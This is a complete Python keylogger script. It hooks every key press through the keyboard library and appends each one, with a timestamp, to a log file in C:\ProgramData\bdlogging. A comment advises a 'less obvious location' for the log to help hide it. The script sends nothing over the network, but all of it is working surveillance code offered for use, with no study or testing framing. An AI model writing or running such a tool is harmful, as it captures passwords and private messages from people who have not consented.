import keyboard
import time
from datetime import datetime
import os

# Define the log file path
log_directory = r"C:\ProgramData\bdlogging"  # Consider a less obvious location
log_file = os.path.join(log_directory, "keystrokes.log")

# Create the directory if it doesn't exist
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

def on_key_event(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # More readable timestamp
    key_name = event.name  # Store key name to handle special keys

    with open(log_file, "a") as f:
        if event.event_type == "down": # Log only key presses (not releases by default)
            if key_name == "space":
                f.write(f"{timestamp} - [space]\n")
            elif key_name == "enter":
                f.write(f"{timestamp} - [enter]\n")
            elif key_name == "backspace":
                f.write(f"{timestamp} - [backspace]\n")
            elif key_name == "tab":
                f.write(f"{timestamp} - [tab]\n")
            elif key_name == "esc":
                f.write(f"{timestamp} - [esc]\n")
            elif len(key_name) == 1: # handles normal characters
                f.write(f"{timestamp} - {key_name}\n")
            else: # catches other special keys
                f.write(f"{timestamp} - [{key_name}]\n")
        f.flush()  # Ensure the data is written to the file immediately


# Hook the keyboard events
keyboard.on_press(on_key_event)

# Keep the program running
try:
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.wait('esc')  # Wait for the 'Esc' key to stop the keylogger
except KeyboardInterrupt:
    print("Script ended.")
finally:
    # Unhook the keyboard events (important!)
    keyboard.unhook_all()
    print("Keylogger stopped. Logs saved to:", log_file)